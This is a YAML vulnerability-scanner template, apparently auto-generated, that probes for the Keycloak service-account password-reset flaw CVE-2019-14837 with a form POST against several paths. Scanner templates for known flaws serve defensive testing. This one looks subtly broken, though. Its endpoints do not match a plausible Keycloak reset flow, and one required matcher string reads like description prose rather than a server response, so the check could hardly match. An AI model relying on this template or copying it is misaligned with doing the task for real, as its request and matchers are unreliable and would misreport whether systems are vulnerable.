id: CVE-2019-14837

info:
  name: Keycloak Service Account Email Reset Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: A flaw was found in Keycloak before version 8.0.0, where the owner of 'placeholder.org' domain can setup a mail server and, knowing only the name of a client, can reset the password and then log in.
  impact: |
    An attacker can take over a service account by resetting its email address.
  remediation: |
    Apply the necessary patches provided by Keycloak to fix the vulnerability (CVE-2019-14837).

http:
  - method: POST
    path:
      - "{{BaseURL}}/realm-config"
      - "{{BaseURL}}/jdbc-client"
      - "{{BaseURL}}/application-url"
      - "{{BaseURL}}/reset-password-email"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      username=service-account-{{client-id}}&email=abc
    matchers:
      - type: word
        words:
          - "Password reset email sent"
          - "Ability to reset password and login with the new password"
        part: body
        condition: and
